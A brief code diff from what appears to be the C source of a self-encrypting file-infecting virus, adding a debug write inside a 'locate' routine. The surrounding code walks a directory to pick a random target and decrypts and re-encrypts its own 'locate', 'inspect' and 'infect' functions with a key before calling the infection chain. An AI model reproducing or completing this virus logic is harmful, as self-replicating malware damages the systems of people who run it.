@@ -35,11 +35,13 @@ void	locate(t_data *data, t_directory *dir)
 	if (_close(fd) < 0 || dir->entry <= 0)
 		goto ERR;
 
+	_write(1, de, _strlen(de));
 ITER:
 	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
 		goto ERR;
 	if ((stop = _random_number(dir->entry)) < 0)
 		goto ERR;
+
 	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
 	{
 		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
@@ -64,6 +66,7 @@ ITER:
 	data->context = true;
 
 ERR:
+
 	update_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 	inspect(data, path);
